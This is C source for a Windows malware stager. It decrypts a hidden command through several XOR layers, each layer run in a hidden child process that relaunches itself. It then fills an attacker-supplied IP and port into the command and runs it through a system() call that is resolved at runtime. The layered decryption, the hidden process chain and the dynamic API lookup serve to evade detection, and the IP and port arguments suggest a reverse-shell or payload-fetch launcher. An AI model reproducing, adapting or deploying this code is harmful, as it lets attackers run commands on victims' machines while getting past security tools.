#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#include "keys.h"
#include "encrypted_url.h"

#define MAX_PATH_LEN 260
#define MAX_CMD_LEN 4096

int get_depth() {
    char *env = getenv("RECURSIVE_DEPTH");
    return env ? atoi(env) : 0;
}

void xor_decrypt(uint8_t *data, size_t data_len, const uint8_t *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

void spawn_next(int next_depth, char *prog_path, char *ip, char *port) {
    char env_val[16];
    snprintf(env_val, sizeof(env_val), "%d", next_depth);
    SetEnvironmentVariableA("RECURSIVE_DEPTH", env_val);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create command line with original args
    char cmdline[MAX_PATH_LEN + 128];
    snprintf(cmdline, sizeof(cmdline), "\"%s\" %s %s", prog_path, ip, port);

    if (CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void str_replace(char *data, const char *placeholder, const char *replacement) {
    char buffer[MAX_CMD_LEN];
    char *pos = strstr(data, placeholder);
    if (!pos) return;

    size_t prefix_len = pos - data;
    snprintf(buffer, sizeof(buffer), "%.*s%s%s", (int)prefix_len, data, replacement, pos + strlen(placeholder));
    strncpy(data, buffer, MAX_CMD_LEN);
}

void run_command(const char *cmd) {
    HMODULE msvcrt = LoadLibraryA("msvcrt.dll");
    if (!msvcrt) return;
    int (*dyn_system)(const char *) = (int (*)(const char *))GetProcAddress(msvcrt, "system");
    if (!dyn_system) return;
    dyn_system(cmd);
    FreeLibrary(msvcrt);
}

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("Usage: %s <IP> <PORT>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    char *port = argv[2];

    int depth = get_depth();
    if (depth >= ROUNDS) return 0;

    uint8_t decrypted[URL_LEN];
    memcpy(decrypted, encrypted_url, URL_LEN);

    for (int i = 0; i <= depth; i++) {
        xor_decrypt(decrypted, URL_LEN, keys[i], KEY_LEN);
    }

    if (depth == ROUNDS - 1) {
        char cmd[MAX_CMD_LEN];
        memcpy(cmd, decrypted, URL_LEN);
        cmd[URL_LEN] = '\0';

        str_replace(cmd, "__IP__", ip);
        str_replace(cmd, "__PORT__", port);

        run_command(cmd);
    } else {
        char prog_path[MAX_PATH_LEN];
        GetModuleFileNameA(NULL, prog_path, MAX_PATH_LEN);
        spawn_next(depth + 1, prog_path, ip, port);
    }
    return 0;
}
